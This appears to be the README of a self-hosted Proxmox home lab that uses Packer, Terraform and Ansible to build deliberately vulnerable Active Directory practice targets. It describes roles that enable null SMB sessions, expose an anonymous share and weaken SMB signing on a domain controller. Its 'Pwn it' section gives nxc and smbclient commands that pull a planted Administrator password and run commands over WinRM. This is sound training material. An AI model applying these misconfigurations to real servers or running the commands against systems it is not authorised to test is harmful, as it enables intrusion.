# Tiegel 

Automated home lab for security research and penetration testing practice setup walktrough. Using Packer, Terraform, and Ansible with a dedicated Proxmox host to build reusable VM templates and spin up per-scenario lab environments.

## Architecture

```
Mac (control machine)
  ├── Packer    ──► Proxmox API (build base templates)
  ├── Terraform ──► Proxmox API (clone & provision VMs)
  └── Ansible   ──► WinRM / SSH into VMs (configure scenarios)

Proxmox Host (192.168.0.245)
├── Templates (built by Packer, never modified after creation)
│   ├── windows-server-2022-base  (VM ID 9000)
│   └── debian-13-base            (VM ID 9001)
└── Labs (cloned by Terraform, configured by Ansible)
    └── ad-null-smb  — Windows DC with intentional null SMB misconfig
```

Each lab is defined in three places with matching names:

- [terraform/labs/<lab>/](terraform/labs/) — VM topology
- [ansible/inventory/<lab>.ini](ansible/inventory/) — host inventory (written by Terraform)
- [ansible/labs/<lab>/site.yml](ansible/labs/) — configuration playbook

---

## End-to-end walkthrough

The four phases below take you a Proxmox host with no VMs all the way to popping the `ad-null-smb` lab. Each phase has a deeper-dive doc; this section is the happy path.

### Phase 1 — Prerequisites (one-time)

Install Packer, Terraform, Ansible localy, create a Proxmox API token, and store credentials in a `.env`:

```bash
brew tap hashicorp/tap
brew install hashicorp/tap/packer hashicorp/tap/terraform ansible
ansible-galaxy collection install ansible.windows community.windows microsoft.ad
```

Create a `.env` at the repo root. (Don't forget to add it to .gitignored):

```bash
export PROXMOX_URL="https://192.168.0.245:8006/api2/json"
export PROXMOX_TOKEN_ID="root@pam!automation"
export PROXMOX_TOKEN_SECRET="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
export PROXMOX_NODE="pve"
```

Verify API access:

```bash
source .env
curl -sk -H "Authorization: PVEAPIToken=${PROXMOX_TOKEN_ID}=${PROXMOX_TOKEN_SECRET}" \
  "${PROXMOX_URL}/version" | python3 -m json.tool
```

Full details (token permissions, SSH key setup, checklist): [docs/phase-1-prerequisites.md](docs/phase-1-prerequisites.md).

### Phase 2 — Build base templates (one-time, ~45 min)

Upload the Windows Server 2022 evaluation ISO + VirtIO drivers to Proxmox via the web UI; download the Debian ISO directly on the Proxmox host (large ISOs upload poorly through the API).

```bash
source .env

cp packer/windows/win-server-2022.pkrvars.hcl.example packer/windows/win-server-2022.pkrvars.hcl
cp packer/linux/debian-base.pkrvars.hcl.example       packer/linux/debian-base.pkrvars.hcl
# Edit both with your Proxmox token credentials.

cd packer/windows && packer init . && packer build -var-file=win-server-2022.pkrvars.hcl .
cd ../linux       && packer init . && packer build -var-file=debian-base.pkrvars.hcl .
```

After both builds, VMs `9000` (Windows) and `9001` (Debian) appear as templates in Proxmox. You only rebuild when you want a fresher base — labs clone from these.

Full details (ISO download links, what each step does, customisation): [docs/phase-2-packer.md](docs/phase-2-packer.md).

### Phase 3 — Author and provision the lab

Each lab is defined by a small set of Terraform files under `terraform/labs/<lab>/` (provider config, a call to the shared `modules/vm`, and an `inventory.tpl` that becomes the Ansible inventory on `apply`). [docs/phase-3-terraform.md](docs/phase-3-terraform.md) walks through writing every file for `ad-null-smb` from scratch.

After the lab files are in place:

```bash
source .env
cd terraform/labs/ad-null-smb
cp terraform.tfvars.example terraform.tfvars
# Edit terraform.tfvars with your Proxmox token credentials.

terraform init
terraform apply
```

Expected output:

```
Apply complete! Resources: 2 added, 0 changed, 0 destroyed.
Outputs:
  dc_ip = "192.168.0.x"
```

Terraform clones template `9000` to `ad-dc01` (VM ID 100), waits for the QEMU guest agent to report the IP, and writes `ansible/inventory/ad-null-smb.ini` automatically. No manual inventory editing needed.

### Phase 4 — Configure the lab

Ansible promotes the VM to a domain controller, applies the intentional misconfig, and drops the loot files:

```bash
cd ansible
ansible-playbook -i inventory/ad-null-smb.ini labs/ad-null-smb/site.yml
```

Three roles run in order:

| Role | What it does |
|------|-------------|
| `win_ad_dc` | Installs AD DS, promotes the host to a DC for `lab.local`, reboots |
| `win_smb_null` | Enables null SMB sessions, creates an anonymous-readable `Public` share, disables the SMB signing requirement (and persists it in the Default DC Policy so `gpupdate` doesn't revert) |
| `win_loot_file` | Drops `C:\Public\credentials.txt` (stage 1 loot) and `C:\Users\Administrator\Desktop\flag.txt` (stage 2 objective) |

Full details (roles reference, what makes the SMB null misconfig actually work on a DC, troubleshooting): [docs/phase-4-ansible.md](docs/phase-4-ansible.md).

### Pwn it

Stage 1 — anonymous SMB → recover the Administrator password:

```bash
$ nxc smb <dc-ip> -u '' -p '' --shares
SMB  <dc-ip>  445  WIN-BASE  Share    Permissions  Remark
SMB  <dc-ip>  445  WIN-BASE  Public   READ

$ smbclient //<dc-ip>/Public -N -c 'get credentials.txt -'
Anonymous login successful
Domain:   lab.local
Username: Administrator
Password: Pr0vingGr0und!
```

Stage 2 — WinRM with the recovered creds → read the flag:

```bash
$ nxc winrm <dc-ip> -u Administrator -p 'Pr0vingGr0und!' \
      -X 'type C:\Users\Administrator\Desktop\flag.txt'
[+] lab.local\Administrator:Pr0vingGr0und! (Pwn3d!)
PG{null_smb_gives_you_wings}
```

### Tear down

```bash
cd terraform/labs/ad-null-smb
terraform destroy
```

The lab VM is deleted; the Phase 2 templates are untouched. To run the same lab again, repeat phases 3 and 4.

---

## Available labs

| Lab | Status | Description | Techniques |
|-----|--------|-------------|------------|
| [`ad-null-smb`](docs/phase-4-ansible.md#lab-ad-null-smb) | working | Single-DC AD with null SMB sessions and a creds-on-anonymous-share misconfig | Anonymous SMB enumeration, credential recovery, WinRM lateral |

New labs follow the same three-place naming convention (`terraform/labs/<lab>/`, `ansible/inventory/<lab>.ini`, `ansible/labs/<lab>/site.yml`) and reuse the roles in `ansible/roles/`.

---

## Repository layout

```
.
├── .env                         (gitignored) Proxmox credentials
├── packer/
│   ├── windows/                 windows-server-2022-base template build
│   └── linux/                   debian-13-base template build
├── terraform/
│   ├── modules/vm/              shared wrapper around proxmox_virtual_environment_vm
│   └── labs/<lab>/              per-lab VM topology
├── ansible/
│   ├── ansible.cfg
│   ├── inventory/               written by Terraform on apply
│   ├── roles/                   reusable (win_ad_dc, win_smb_null, win_loot_file, …)
│   └── labs/<lab>/site.yml      composes roles for a given lab
└── docs/
    ├── phase-1-prerequisites.md
    ├── phase-2-packer.md
    ├── phase-3-terraform.md
    └── phase-4-ansible.md
```

---

## Requirements

- Proxmox VE 8.x host on bare metal, reachable from the Mac
- Proxmox API token with VM clone/allocate permissions (see Phase 1)
- 16 GB+ RAM on the Proxmox host recommended (the Windows DC needs 4 GB to promote cleanly)
- WinRM (5985) and/or SSH reachable from the Mac to lab VMs
